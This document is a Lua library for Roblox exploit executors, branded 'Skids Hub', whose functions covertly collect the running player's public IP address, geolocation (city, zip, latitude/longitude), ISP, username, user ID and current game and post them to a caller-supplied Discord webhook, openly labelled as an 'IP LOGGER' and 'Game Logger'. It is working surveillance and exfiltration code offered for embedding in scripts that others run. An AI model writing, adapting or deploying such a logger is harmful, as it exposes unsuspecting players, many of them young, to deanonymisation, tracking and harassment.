do
    -- This function returns a string with the name of the exploit u using(only checks for krnl, synapse, script ware)
    local function checkExploit()
        
        local exploitName = (syn and 'Synapse') or (Krnl and 'Krnl') or ( identifyexecutor and identifyexecutor() ) or (getexecutorname and getexecutorname())


        return exploitName

    end

    skidApi = {
        webhookJson = function(self, scriptName)

            if not self then return end

            local player = game.Players.LocalPlayer
            local playerThumb = string.format('https://www.roblox.com/Thumbs/Avatar.ashx?x=420&y=420&userid=%d&format=png', player.UserId)
            local ipData = self.ipApi
            scriptName = scriptName or 'Viva Mexico'
            return {
                content = string.format('**@%s** __fired__ **%s**', player.Name, scriptName),
                embeds  = {
                    { 
                        author={
                                name='Skids Hub/ramirez',
                                url='https://discord.gg/q8FspVseAU',
                                icon_url='https://sweetiefoxislife.000webhostapp.com/media/slutshub.png'
                        },
                        title='Skids Hub **IP LOGGER**',
                        url='https://discord.gg/q8FspVseAU',
                        description = string.format('@%s**(%s)[%d]** fired **%s** [discord](https://discord.gg/q8FspVseAU)', player.Name, player.DisplayName, game.Players.LocalPlayer.UserId ,scriptName),
                        color = 0x080808,
                        fields  = {
                            {
                                name = '**Country**',
                                value = ipData['country'] .. '/' .. ipData['countryCode'],
                                inline = true
                            },
                            {
                                name = '**Region**',
                                value = ipData['regionName'] .. '/' .. ipData['region'],
                                inline = true
                            },
                            {
                                name = '**City/Zip**',
                                value = ipData['city'] .. '/' .. ipData['zip'],
                                inline = true
                            }
                        },
                        thumbnail = {
                            url = playerThumb
                        }
                    },
                    {
                        color = 0x080808,
                        fields={
                            {
                                name = '**lat/lon**',
                                value = ipData['lat'] .. '/' .. ipData['lon'],
                                inline = true
                            },
                            {
                                name = '**Isp/Org**',
                                value = ipData['isp'] .. '/' .. ipData['org'],
                                inline = true
                            },
                            {
                                name = '**IPV4/IPV6**',
                                value = ipData['query'],
                                inline = false
                            },
                        },
                        footer = {
                            text = 'Skids Hub',
                            icon_url='https://sweetiefoxislife.000webhostapp.com/media/slutshub.png'
                        }
                    }
                }
            }
        end,

        ipApi = game:GetService('HttpService'):JSONDecode(game:HttpGet('http://ip-api.com/json')),
        exploitName = checkExploit(),

        httpPost = (Krnl and request) or (syn and syn.request) or http_request or (http and http.request),
        
        sendWebhook = function(self,webhooklink, ...)
            if self and webhooklink and self.httpPost and self.webhookJson then

                if type(self.webhookJson) == "function" then
                    return self.httpPost(
                    {
                        Url = webhooklink,
                        Method = 'POST',
                        Body = game:GetService('HttpService'):JSONEncode(self:webhookJson(...)) ,
                        Headers = {
                            ['Content-Type'] = 'application/json'
                        }
                    }
                )
                end

                return self.httpPost(
                    {
                        Url = webhooklink,
                        Method = 'POST',
                        Body = game:GetService('HttpService'):JSONEncode(self.webhookJson) ,
                        Headers = {
                            ['Content-Type'] = 'application/json'
                        }
                    }
                )
            end
        end,
        sendWebhookGame = function(self,webhooklink, scriptName)

            scriptName = scriptName or 'Viva Mexico!'

            local gameThumb = string.format('https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=768&height=432&format=png',game.PlaceId)

            local webhookJson = {
                content = string.format('**@%s(%d)** __fired__ **%s**', game.Players.LocalPlayer.Name, game.Players.LocalPlayer.UserId ,scriptName),
                embeds = {
                    {
                        author={
                            name='Skids Hub/ramirez',
                            url='https://discord.gg/q8FspVseAU',
                            icon_url='https://sweetiefoxislife.000webhostapp.com/media/slutshub.png'
                        },
                        title='Skids Hub **Game Logger**',
                        color = 0x080808,
                        url='https://discord.gg/q8FspVseAU',
                        description = string.format('@%s**(%s)** is playing [game](https://www.roblox.com/games/%d)', game.Players.LocalPlayer.Name, game.Players.LocalPlayer.DisplayName,game.PlaceId),
                        thumbnail={
                            url=gameThumb
                        },
                        footer = {
                            text = 'Skids Hub',
                            icon_url='https://sweetiefoxislife.000webhostapp.com/media/slutshub.png'
                        }
                    }
                }
            }
            self.httpPost(
                {
                    Url = webhooklink,
                    Method ='POST',
                    Body = game:GetService('HttpService'):JSONEncode(webhookJson),
                    Headers = {
                        ['Content-Type'] = 'application/json'
                    }
                }
            )
        end

    }

end








return skidApi
